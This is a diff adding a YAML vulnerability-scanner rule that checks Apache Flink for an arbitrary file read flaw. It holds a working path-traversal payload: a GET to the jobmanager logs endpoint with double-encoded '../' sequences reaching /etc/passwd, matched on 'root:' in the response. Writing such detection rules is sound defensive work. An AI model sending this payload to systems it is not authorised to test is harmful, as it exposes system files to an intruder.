@@ -1,0 +1,11 @@
+name: Apache-Flink-read-file
+description: "任意文件读取"
+matchCount: 1
+rules:
+  - method: GET
+    path: "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+    expression:
+      status: 200
+      body_any:
+        - "root:"
+        - "daemon:"
